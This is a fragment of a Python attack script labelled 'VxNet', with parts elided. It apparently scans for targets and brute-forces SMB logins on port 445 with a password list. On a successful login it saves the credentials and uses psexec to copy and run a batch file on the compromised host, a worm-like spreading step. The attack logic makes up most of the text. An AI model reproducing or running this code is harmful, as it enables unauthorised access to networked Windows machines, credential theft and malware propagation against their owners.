...
check = subprocess.check_output("pip3 install pyfiglet string random sys", shell = True)

print(pyfiglet.figlet_format("VxNet"))
...
def brute_force():
    ...
    for IP in detect_target():
            ...
            for password in password_list():
                check = subprocess.check_output(f'python {filename}.py -ip {IP} -port 445 -username stackops -password {password} -v' , shell=True)
                print(f"{check}")   
                
                if "success: ('" in str(check):
                    a= f"{IP}: username: stackops | password: {password}"
                    collector.append(a)
                    subprocess.call(f"psexec \\\\{IP} -d -siu stackops -p {password} -c C:\\Users\\stackops\\Desktop\\{filename}.bat", shell=True)
                    break                            
